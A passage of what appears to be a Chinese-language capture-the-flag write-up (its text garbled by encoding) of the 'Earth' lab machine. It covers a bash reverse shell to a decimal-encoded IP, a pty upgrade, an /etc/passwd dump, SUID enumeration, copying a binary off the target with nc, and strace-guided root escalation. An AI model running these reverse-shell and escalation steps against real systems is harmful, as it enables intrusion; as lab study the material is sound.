<p>3232256385 ---&gt; 192.168.81.129 çš„ 10 è¿›åˆ¶ã€‚<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.metools.info/other/ipconvert162.html">IP åœ°å€åå…­è¿›åˆ¶ã€äºŒè¿›åˆ¶ã€åè¿›åˆ¶è½¬æ¢åœ¨çº¿å·¥å…·</a></p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token function">sudo</span> <span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/3232256385/9999 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span></pre></td></tr></tbody></table></figure><p>å¼¹æ˜¯å¼¹åˆ°äº†ä½†æ˜¯â€¦â€¦<span class="spoiler" title="ä½ çŸ¥é“å¾—å¤ªå¤šäº†"> ä½œè€…æˆ‘æ˜Ÿæ˜Ÿä½ ä¸ª **ğŸ˜ </span></p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505130316045.webp" alt="image-20240505130316045"></p>
<p>åº”è¯¥æ˜¯ sudo çš„é—®é¢˜ï¼Œæ²¡æœ‰ç®¡ç†å‘˜æƒé™æ²¡æœ‰å¡«å†™å¯†ç å¯¼è‡´ CGI è¿›ç¨‹è¢«å…³é—­ã€‚</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/3232256385/9999 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span></pre></td></tr></tbody></table></figure><p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505135912477.webp" alt="image-20240505135912477"></p>
<p>ä¸€èˆ¬åå¼¹çš„ webshell éƒ½æ˜¯è€å¼±ç—…æ®‹ï¼Œä¸æ”¯æŒä¸Šä¸‹æ–‡å¹¶ä¸”æ— æ³•è¿è¡Œäº¤äº’å¼å‘½ä»¤ã€‚å·²çŸ¥é¶æœºæœ‰ python ç¯å¢ƒï¼Œè¯•ä¸€è¯•èƒ½ä¸èƒ½æ‰“å¼€äº¤äº’å¼ shellï¼Œç„¶åå°è¯•ä¸‹ææƒã€‚</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>python <span class="token parameter variable">-c</span> <span class="token string">'import pty; pty.spawn("/bin/bash")'</span></pre></td></tr></tbody></table></figure><p>æ‰“å¼€åè¿˜æ˜¯è¿™ä¸ªç»ˆç«¯ï¼Œå¹¶ä¸”å¯ä»¥äº¤äº’ã€‚ä¸ºä»€ä¹ˆ webshell ç›´æ¥å°±æ˜¯äº¤äº’å¼ shellï¼Ÿå¤§æ¦‚å’Œ CGI çš„è¾“å…¥è¾“å‡ºæµæœ‰å…³ç³»å§ï¼ˆåªæ˜¯çŒœæµ‹ï¼‰ã€‚</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505150248362.webp" alt="image-20240505150248362"></p>
<p>æŸ¥çœ‹ <code>/etc/passwd</code> ï¼Œå½“å‰ç”¨æˆ·æ˜¯ apacheã€‚</p>
<figure class="highlight text"><figcaption data-lang="text"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>root:x:0:0:root:/root:/bin/bash</pre></td></tr><tr><td data-num="2"></td><td><pre>bin:x:1:1:bin:/bin:/sbin/nologin</pre></td></tr><tr><td data-num="3"></td><td><pre>daemon:x:2:2:daemon:/sbin:/sbin/nologin</pre></td></tr><tr><td data-num="4"></td><td><pre>adm:x:3:4:adm:/var/adm:/sbin/nologin</pre></td></tr><tr><td data-num="5"></td><td><pre>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</pre></td></tr><tr><td data-num="6"></td><td><pre>sync:x:5:0:sync:/sbin:/bin/sync</pre></td></tr><tr><td data-num="7"></td><td><pre>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</pre></td></tr><tr><td data-num="8"></td><td><pre>halt:x:7:0:halt:/sbin:/sbin/halt</pre></td></tr><tr><td data-num="9"></td><td><pre>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</pre></td></tr><tr><td data-num="10"></td><td><pre>operator:x:11:0:operator:/root:/sbin/nologin</pre></td></tr><tr><td data-num="11"></td><td><pre>games:x:12:100:games:/usr/games:/sbin/nologin</pre></td></tr><tr><td data-num="12"></td><td><pre>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</pre></td></tr><tr><td data-num="13"></td><td><pre>nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin</pre></td></tr><tr><td data-num="14"></td><td><pre>systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin</pre></td></tr><tr><td data-num="15"></td><td><pre>systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin</pre></td></tr><tr><td data-num="16"></td><td><pre>systemd-oom:x:998:996:systemd Userspace OOM Killer:/:/sbin/nologin</pre></td></tr><tr><td data-num="17"></td><td><pre>systemd-timesync:x:997:995:systemd Time Synchronization:/:/sbin/nologin</pre></td></tr><tr><td data-num="18"></td><td><pre>dbus:x:81:81:System message bus:/:/sbin/nologin</pre></td></tr><tr><td data-num="19"></td><td><pre>polkitd:x:996:994:User for polkitd:/:/sbin/nologin</pre></td></tr><tr><td data-num="20"></td><td><pre>rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin</pre></td></tr><tr><td data-num="21"></td><td><pre>cockpit-ws:x:995:991:User for cockpit web service:/nonexisting:/sbin/nologin</pre></td></tr><tr><td data-num="22"></td><td><pre>cockpit-wsinstance:x:994:990:User for cockpit-ws instances:/nonexisting:/sbin/nologin</pre></td></tr><tr><td data-num="23"></td><td><pre>tss:x:59:59:Account used for TPM access:/dev/null:/sbin/nologin</pre></td></tr><tr><td data-num="24"></td><td><pre>abrt:x:173:173::/etc/abrt:/sbin/nologin</pre></td></tr><tr><td data-num="25"></td><td><pre>setroubleshoot:x:993:989::/var/lib/setroubleshoot:/sbin/nologin</pre></td></tr><tr><td data-num="26"></td><td><pre>rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin</pre></td></tr><tr><td data-num="27"></td><td><pre>sshd:x:74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin</pre></td></tr><tr><td data-num="28"></td><td><pre>dnsmasq:x:992:988:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin</pre></td></tr><tr><td data-num="29"></td><td><pre>chrony:x:991:987::/var/lib/chrony:/sbin/nologin</pre></td></tr><tr><td data-num="30"></td><td><pre>tcpdump:x:72:72::/:/sbin/nologin</pre></td></tr><tr><td data-num="31"></td><td><pre>systemd-network:x:985:985:systemd Network Management:/:/usr/sbin/nologin</pre></td></tr><tr><td data-num="32"></td><td><pre>unbound:x:984:984:Unbound DNS resolver:/etc/unbound:/sbin/nologin</pre></td></tr><tr><td data-num="33"></td><td><pre>clevis:x:983:983:Clevis Decryption Framework unprivileged user:/var/cache/clevis:/usr/sbin/nologin</pre></td></tr><tr><td data-num="34"></td><td><pre>earth:x:1000:1000::/home/earth:/bin/bash</pre></td></tr><tr><td data-num="35"></td><td><pre>apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin</pre></td></tr></tbody></table></figure><p>è¯•ä¸‹æ‰¾æ‰¾ flagï¼š</p>
<p><code>find / -name 'flag*'</code>      ----&gt; ç©º</p>
<p><code>find / -name 'fla*' </code>        ----&gt; ç©º</p>
<h1 id="get-earth-shell"><a class="anchor" href="#get-earth-shell">#</a> Get-Earth-Shell</h1>
<p>æ²¡æ‰¾åˆ° flag å°±æææƒå§</p>
<figure class="highlight bash"><figcaption data-lang="bash"><span>æ³¨æ„ç¬¬15è¡Œ</span></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>bash-5.1$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>/usr/bin/chage</pre></td></tr><tr><td data-num="4"></td><td><pre>/usr/bin/gpasswd</pre></td></tr><tr><td data-num="5"></td><td><pre>/usr/bin/newgrp</pre></td></tr><tr><td data-num="6"></td><td><pre>/usr/bin/su</pre></td></tr><tr><td data-num="7"></td><td><pre>/usr/bin/mount</pre></td></tr><tr><td data-num="8"></td><td><pre>/usr/bin/umount</pre></td></tr><tr><td data-num="9"></td><td><pre>/usr/bin/pkexec</pre></td></tr><tr><td data-num="10"></td><td><pre>/usr/bin/passwd</pre></td></tr><tr><td data-num="11"></td><td><pre>/usr/bin/chfn</pre></td></tr><tr><td data-num="12"></td><td><pre>/usr/bin/chsh</pre></td></tr><tr><td data-num="13"></td><td><pre>/usr/bin/at</pre></td></tr><tr><td data-num="14"></td><td><pre>/usr/bin/sudo</pre></td></tr><tr class="marked"><td data-num="15"></td><td><pre>/usr/bin/reset_root</pre></td></tr><tr><td data-num="16"></td><td><pre>/usr/sbin/grub2-set-bootflag</pre></td></tr><tr><td data-num="17"></td><td><pre>/usr/sbin/pam_timestamp_check</pre></td></tr><tr><td data-num="18"></td><td><pre>/usr/sbin/unix_chkpwd</pre></td></tr><tr><td data-num="19"></td><td><pre>/usr/sbin/mount.nfs</pre></td></tr><tr><td data-num="20"></td><td><pre>/usr/lib/polkit-1/polkit-agent-helper-1</pre></td></tr></tbody></table></figure><details class="info"><summary>é‡åˆ°äº†å¾ˆå¤šæ²¡è§è¿‡äº†å‘½ä»¤ï¼Œæˆ‘éƒ½å»äº†è§£äº†ä¸‹ï¼š</summary><div>
<ul class="lvl-1">
<li class="lvl-2">
<p><code>chage</code> ï¼ˆchange user age informationï¼‰ç”¨äºæ›´æ”¹ç”¨æˆ·çš„è´¦æˆ·è¿‡æœŸä¿¡æ¯ã€‚è¿™äº›ä¿¡æ¯åŒ…æ‹¬è´¦æˆ·çš„è¿‡æœŸæ—¥æœŸã€å¯†ç çš„æœ€è¿‘å’Œæœ€æ—§æ›´æ”¹æ—¶é—´ã€å¯†ç çš„è­¦å‘ŠæœŸã€å¯†ç çš„å®½é™æœŸå’Œè´¦æˆ·çš„ä¼‘çœ æœŸã€‚</p>
</li>
<li class="lvl-2">
<p><code>gpasswd</code>  ç”¨æ¥ç®¡ç†ç»„ï¼Œå®ƒå¯ä»¥ç”¨äºæ·»åŠ æˆ–åˆ é™¤ç»„ä¸­çš„ç”¨æˆ·ã€æ›´æ”¹ç»„çš„å¯†ç æˆ–æ›´æ”¹ç»„çš„ç‰¹æ€§ã€‚</p>
</li>
<li class="lvl-2">
<p><code>newgrp</code>  ç”¨äºæ”¹å˜å½“å‰ç”¨æˆ·çš„ç™»å½•ç»„ï¼Œå³ä¸´æ—¶æ”¹å˜ç”¨æˆ·çš„é»˜è®¤ç»„ã€‚ç”¨æˆ·éœ€è¦çŸ¥é“è¯¥ç»„çš„å¯†ç ï¼Œå¹¶ä¸”åªèƒ½åˆ‡æ¢åˆ°ä»–ä»¬å±äºçš„ç»„ã€‚</p>
</li>
<li class="lvl-2">
<p><code>mount</code>  å‘½ä»¤ç”¨äºå°†æ–‡ä»¶ç³»ç»ŸæŒ‚è½½åˆ° Linux ç³»ç»Ÿçš„ç›®å½•ç»“æ„ä¸­ã€‚æŒ‚è½½åï¼Œç”¨æˆ·å’Œç¨‹åºå°±å¯ä»¥è®¿é—®æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ã€‚</p>
</li>
<li class="lvl-2">
<p><code>umount</code>  ç”¨äºå¸è½½å·²ç»æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿã€‚å¸è½½åï¼Œæ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶å°†ä¸å†å¯è®¿é—®ã€‚</p>
</li>
<li class="lvl-2">
<p><code>pkexec</code>  æ˜¯ PolicyKit çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå…è®¸éç‰¹æƒç”¨æˆ·ä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œå‘½ä»¤ã€‚ <code>pkexec</code>  ä¼šæç¤ºç”¨æˆ·è¾“å…¥å…¶å¯†ç ï¼Œç„¶åä»¥ root ç”¨æˆ·çš„æƒé™è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚</p>
</li>
<li class="lvl-2">
<p><code>chsh </code> ç”¨æ¥æ›´æ¢ç™»å½•ç³»ç»Ÿæ—¶ä½¿ç”¨çš„ shellã€‚ <code>-l</code>  æŸ¥çœ‹ <code>/etc/shells</code> ï¼Œ <code>-s</code>  ä¿®æ”¹å½“å‰ç”¨æˆ·çš„ shellï¼ˆå®é™…ä¸Šå°±æ˜¯ä¿®æ”¹ <code>/etc/shells</code> ï¼‰ï¼Œä¿®æ”¹åéœ€è¦é‡å¯ã€‚</p>
</li>
<li class="lvl-2">
<p><code>at [é€‰é¡¹] æ—¶é—´</code> ï¼Œç”¨äºå®‰æ’åœ¨æŒ‡å®šæ—¶é—´æ‰§è¡Œåå°ä»»åŠ¡ã€‚</p>
</li>
<li class="lvl-2">
<p><code>su</code>  å’Œ <code>sudo</code>  éƒ½çŸ¥é“ã€‚</p>
</li>
<li class="lvl-2">
<p><code>reset_root</code>  ç”¨äºé‡ç½® root ç”¨æˆ·çš„å¯†ç ã€‚</p>
</li>
<li class="lvl-2">
<p><code>grub2-set-bootflag</code>  ç”¨äºè®¾ç½® grub2 å¼•å¯¼æ ‡å¿—ã€‚</p>
</li>
<li class="lvl-2">
<p><code>unix_chkpwd</code>  ç”¨äºæ£€æŸ¥ç”¨æˆ·å¯†ç æ˜¯å¦ç¬¦åˆç³»ç»Ÿå¯†ç ç­–ç•¥ã€‚ç”±ç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨ï¼Œç”¨æˆ·æ— éœ€æ‰‹åŠ¨æ‰§è¡Œã€‚</p>
</li>
<li class="lvl-2">
<p><code>mount.nfs [é€‰é¡¹] &lt;æœåŠ¡å™¨åœ°å€&gt;:&lt;è¿œç¨‹è·¯å¾„&gt; &lt;æœ¬åœ°è·¯å¾„&gt;</code>  ç”¨äºæŒ‚è½½ NFS æ–‡ä»¶ç³»ç»Ÿã€‚</p>
</li>
<li class="lvl-2">
<p><code>polkit-agent-helper-1</code>  æ˜¯ Polkitï¼ˆPolicyKitï¼‰æ¡†æ¶çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå‘ç”¨æˆ·æ˜¾ç¤ºæƒé™è¯·æ±‚å¯¹è¯æ¡†å¹¶æ‰§è¡Œæƒé™æ“ä½œã€‚ç”±ç³»ç»Ÿè‡ªåŠ¨è°ƒç”¨ã€‚</p>
</li>
</ul>
</div></details>
<p>çœ‹åˆ° reset_root æˆ‘ä»¥ä¸ºæœ‰æå¤´ï¼Œä½†æ˜¯â€¦â€¦</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505151019452.webp" alt="image-20240505151019452"></p>
<p><strong>æ£€æŸ¥æ˜¯å¦å­˜åœ¨é‡ç½®è§¦å‘å™¨...<br>
 é‡ç½®å¤±è´¥ï¼Œæ‰€æœ‰è§¦å‘å™¨éƒ½ä¸å­˜åœ¨ã€‚</strong></p>
<p>åœ¨è¿™é‡Œå¡äº†å‡ ä¸ªå°æ—¶ï¼Œå†æ±‚åŠ©ä¸€ä¸‹ wp å§ã€‚</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token function">nc</span> <span class="token parameter variable">-nlvp</span> <span class="token number">9998</span> <span class="token operator">&gt;</span>reset_root     <span class="token comment"># kali æ‰§è¡Œï¼Œç›‘å¬ç«¯å£ 9998ï¼Œç»“æœå†™å…¥æ–‡ä»¶</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">nc</span>  <span class="token number">192.168</span>.81.129 <span class="token number">9998</span> <span class="token operator">&lt;</span> /usr/bin/reset_root   <span class="token comment">#  å€ŸåŠ© nc å°† reset_root æ–‡ä»¶å‘åˆ° kali ä¸Š</span></pre></td></tr><tr><td data-num="3"></td><td><pre> <span class="token function">chmod</span> +x reset_root   <span class="token comment">#  ä½¿ç”¨ä¹‹å‰éœ€è¦å°† reset_root èµ‹äºæ‰§è¡Œæƒé™ï¼Œ</span></pre></td></tr></tbody></table></figure><p>ç„¶åæœ¬åœ°ç”¨<strong> strace</strong> å‘½ä»¤è°ƒè¯•ï¼ŒåŸè°…æˆ‘çŸ¥è¯†æµ…è–„ï¼Œåˆå­¦äº†ä¸‹ä»€ä¹ˆæ˜¯ straceã€‚</p>
<details class="primary"><summary>è°ƒè¯•å·¥å…·strace</summary><div>
<p><code>strace</code>  æ˜¯ä¸€ä¸ªç”¨äºè·Ÿè¸ªå’Œè®°å½•è¿›ç¨‹ç³»ç»Ÿè°ƒç”¨ä»¥åŠä¿¡å·çš„å·¥å…·ã€‚å®ƒèƒ½å¤Ÿç›‘è§†è¿›ç¨‹æ‰§è¡ŒæœŸé—´å‘ç”Ÿçš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¹¶å°†è¿™äº›è°ƒç”¨ä»¥åŠå®ƒä»¬çš„å‚æ•°å’Œè¿”å›å€¼è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºæˆ–æŒ‡å®šçš„æ–‡ä»¶ä¸­ã€‚ <code>strace</code>  å¸¸ç”¨äºè°ƒè¯•ç¨‹åºã€åˆ†æè¿›ç¨‹çš„è¡Œä¸ºã€æŸ¥æ‰¾æ€§èƒ½é—®é¢˜ç­‰ã€‚</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token function">apt</span> <span class="token function">install</span> <span class="token function">strace</span>     <span class="token comment">#  å®‰è£… strace è°ƒè¯•å·¥å…·</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">strace</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token builtin class-name">command</span> <span class="token punctuation">[</span>arguments<span class="token punctuation">]</span>   <span class="token comment">#  å‘½ä»¤æ ¼å¼  command æ˜¯è¢«è°ƒè¯•çš„å‘½ä»¤</span></pre></td></tr></tbody></table></figure><table>
<thead>
<tr>
<th>é€‰é¡¹</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>-d</code>  æˆ–  <code>--debug</code></td>
<td>æ‰“å°  <code>strace</code>  å†…éƒ¨è°ƒè¯•ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><code>-f</code>  æˆ–  <code>--follow</code></td>
<td>è·Ÿè¸ªå­è¿›ç¨‹ã€‚å½“ç»“åˆ  <code>-p</code>  ä½¿ç”¨æ—¶ï¼Œè·Ÿè¸ªç‰¹å®šè¿›ç¨‹çš„å­å­™ã€‚</td>
</tr>
<tr>
<td><code>-ff</code></td>
<td><code>-f</code>  çš„æŒä¹…ç‰ˆæœ¬ï¼Œç”¨äºè·Ÿè¸ªç”± PID æ–‡ä»¶æŒ‡å®šçš„ PIDã€‚</td>
</tr>
<tr>
<td><code>-F</code></td>
<td>æ‰“å°æ–‡ä»¶æè¿°ç¬¦ï¼Œè€Œä¸æ˜¯å‘½ä»¤åç§°ã€‚</td>
</tr>
<tr>
<td><code>-i</code>  æˆ–  <code>--trace=all</code></td>
<td>è·Ÿè¸ªæ‰€æœ‰ç³»ç»Ÿè°ƒç”¨ã€‚</td>
</tr>
<tr>
<td><code>-p PID</code>  æˆ–  <code>--pid=PID</code></td>
<td>è·Ÿè¸ªæŒ‡å®šçš„è¿›ç¨‹ IDã€‚</td>
</tr>
<tr>
<td><code>-s STRLEN</code></td>
<td>è®¾ç½®è¾“å‡ºä¸­æ¯ä¸ªè¡Œçš„å­—ç¬¦ä¸²æ‰“å°çš„æœ€å¤§é•¿åº¦ã€‚</td>
</tr>
<tr>
<td><code>-t</code>  æˆ–  <code>--time</code></td>
<td>åœ¨æ¯è¡Œè¾“å‡ºå‰åŠ ä¸Šæ—¶é—´æˆ³ã€‚</td>
</tr>
<tr>
<td><code>-tt</code></td>
<td>æ‰“å°çº³ç§’çº§çš„æ—¶é—´æˆ³ã€‚</td>
</tr>
<tr>
<td><code>-T</code></td>
<td>æ˜¾ç¤ºæ¯ä¸ªç³»ç»Ÿè°ƒç”¨çš„æ—¶é—´å¼€é”€ã€‚</td>
</tr>
<tr>
<td><code>-v</code>  æˆ–  <code>--verbose</code></td>
<td>æ˜¾ç¤ºç³»ç»Ÿè°ƒç”¨çš„è¯¦ç»†ä¿¡æ¯ã€‚</td>
</tr>
<tr>
<td><code>-e TRACEEVENT</code></td>
<td>è·Ÿè¸ªç‰¹å®šçš„ç³»ç»Ÿè°ƒç”¨æˆ–ä¿¡å·ã€‚ä¾‹å¦‚ï¼Œ <code>-e open</code>  å°†åªè·Ÿè¸ª  <code>open</code>  è°ƒç”¨ã€‚</td>
</tr>
</tbody>
</table>
<p><code>-e</code>  å‚æ•°å¯ä»¥æ¥å—ä»¥ä¸‹å‡ ç§ç±»å‹çš„ç±»åˆ«ä½œä¸ºå‚æ•°ï¼š</p>
<ul class="lvl-1">
<li class="lvl-2">
<p><code>trace</code> ï¼šç³»ç»Ÿè°ƒç”¨ã€‚</p>
</li>
<li class="lvl-2">
<p><code>signal</code> ï¼šä¿¡å·ã€‚</p>
</li>
<li class="lvl-2">
<p><code>process</code> ï¼šè¿›ç¨‹äº‹ä»¶ã€‚</p>
</li>
<li class="lvl-2">
<p><code>exec</code> ï¼šexec äº‹ä»¶ã€‚</p>
</li>
<li class="lvl-2">
<p><code>read</code> ã€ <code>write</code> ã€ <code>socket</code>  ç­‰ï¼šç‰¹å®šç±»å‹çš„ç³»ç»Ÿè°ƒç”¨ã€‚</p>
</li>
</ul>
<p>Come from ğŸ¤–GPT</p>
</div></details>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505184945177.webp" alt="image-20240505184945177"></p>
<figure class="highlight bash"><figcaption data-lang="bash"><span>Problems</span></figcaption><table><tbody><tr><td data-num="1"></td><td><pre>access<span class="token punctuation">(</span><span class="token string">"/dev/shm/kHgTFI5G"</span>, F_OK<span class="token punctuation">)</span>       <span class="token operator">=</span> <span class="token parameter variable">-1</span> ENOENT <span class="token punctuation">(</span>æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>access<span class="token punctuation">(</span><span class="token string">"/dev/shm/Zw7bV9U5"</span>, F_OK<span class="token punctuation">)</span>       <span class="token operator">=</span> <span class="token parameter variable">-1</span> ENOENT <span class="token punctuation">(</span>æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>access<span class="token punctuation">(</span><span class="token string">"/tmp/kcM0Wewe"</span>, F_OK<span class="token punctuation">)</span>           <span class="token operator">=</span> <span class="token parameter variable">-1</span> ENOENT <span class="token punctuation">(</span>æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•<span class="token punctuation">)</span></pre></td></tr></tbody></table></figure><p>é—®é¢˜å°±åœ¨è¿™é‡Œäº†ï¼Œç„¶åå°±æ˜¯éå¸¸ç®€å•ç²—æš´çš„ â€”â€” åˆ›å»ºè¿™ä¸‰ä¸ªæ–‡ä»¶ã€‚</p>
<figure class="highlight bash"><figcaption data-lang="bash"></figcaption><table><tbody><tr><td data-num="1"></td><td><pre><span class="token function">touch</span>  /dev/shm/kHgTFI5G</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">touch</span> /dev/shm/Zw7bV9U5</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">touch</span> /tmp/kcM0Wewe</pre></td></tr></tbody></table></figure><p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505185404951.webp" alt="image-20240505185404951"></p>
<p>åœ¨é¶æœºä¸Šç™»å½•æˆåŠŸï¼ï¼ï¼</p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505185531193.webp" alt="image-20240505185531193"></p>
<p>åŸæ¥ flag å‰åéƒ½å­—ç¬¦å•Šâ€¦â€¦ï¼ˆé•¿å¹ä¸€å£æ°”ï¼‰ã€‚æœ€åä¹Ÿæ˜¯æ‰¾åˆ°äº†ä¸¤ä¸ªğŸš©ğŸš©flag</p>
<p><code>/root/root_flag.txt</code>  &amp;  <code>/var/earth_web/user_flag.txt</code></p>
<p><img loading="lazy" data-src="/images/Earth%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95.assets/image-20240505190233308.webp" alt="image-20240505190233308"></p>
<h1 id="finally"><a class="anchor" href="#finally">#</a> Finally</h1>
<p>æ¯ä¸ªç½‘å®‰äººçš„å¿…ä¿®è¯¾å¤§æ¦‚å°±æ˜¯ï¼š</p>
<p><strong>With Great Rower Comes Great Responsibilities</strong></p>
<p><img loading="lazy" data-src="https://s2.loli.net/2024/05/05/A8yelkGqMTRvP6a.jpg" alt="With Great Rower Comes Great Responsibilities"></p>
<div class="tags"><a href="/tags/Penetration-Test/" rel="tag"><i class="ic i-tag"></i>Penetration Test</a></div></div><footer><div class="meta"><span class="icon"><i class="ic i-eye"></i></span><span>æ­¤æ–‡ç« å·²è¢«é˜…è¯»æ¬¡æ•°:</span><span class="waline-pageview-count" id="twikoo_visitors" data-path="post/Get-Earth-Shell/">æ­£åœ¨åŠ è½½...</span><span class="item"><span class="icon"><i class="ic i-calendar-check"></i></span><span class="text">æ›´æ–°äº</span><time title="ä¿®æ”¹æ—¶é—´ï¼š2024-05-05 22:39:49" itemprop="dateModified" datetime="2024-05-05T22:39:49+08:00">2024-05-05</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i>èµèµ</button><p>è¯·æˆ‘å–[èŒ¶]~(ï¿£â–½ï¿£)~*</p><div id="qr"><div><img loading="lazy" data-src="/assets/wechatpay.webp" alt="MorIo24 å¾®ä¿¡æ”¯ä»˜"><p>å¾®ä¿¡æ”¯ä»˜</p></div><div><img loading="lazy" data-src="/assets/alipay.webp" alt="MorIo24 æ”¯ä»˜å®"><p>æ”¯ä»˜å®</p></div></div></div><div id="copyright"><ul><li class="author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>MorIo24<i class="ic i-at"><em>@</em></i>Glad to see U (â—¦Ë™â–½Ë™â—¦)</li><li class="link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="https://ctf-learner.github.io/post/Get-Earth-Shell/" title="Get Earth Shell">https://ctf-learner.github.io/post/Get-Earth-Shell/</a></li><li class="license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a target="_blank" rel="noopener external nofollow noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/post/MSF-%E4%B8%87%E5%8D%83waf%E4%B8%AD%E5%8F%96ROOT%E9%A6%96%E7%BA%A7/" rel="prev" itemprop="url" data-background-image="https://s2.loli.net/2024/04/15/BXrQFv9hOn2iZm6.webp" title="MSF---ä¸‡åƒwafä¸­å–ROOTé¦–çº§"><span class="type">ä¸Šä¸€ç¯‡</span><span class="category"><i class="ic i-flag"></i>Penetration Test</span><h3>MSF---ä¸‡åƒwafä¸­å–ROOTé¦–çº§</h3></a></div><div class="item right"></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="æ–‡ç« ç›®å½•"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text"> ä¸»æœºå‘ç°</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E4%BA%86%E4%B8%80%E5%A0%86%E5%BC%AF%E5%AD%90"><span class="toc-number">2.</span> <span class="toc-text"> ç»•äº†ä¸€å †å¼¯å­</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#dns%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E9%97%AE%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text"> DNS åŸŸåè§£æé—®é¢˜</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E8%AF%81%E4%B9%A6%E9%AA%8C%E8%AF%81"><span class="toc-number">4.</span> <span class="toc-text"> åå‘ä»£ç†ï¼Ÿï¼è¯ä¹¦éªŒè¯ï¼Ÿï¼</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xor%E5%88%9D%E6%8E%A2"><span 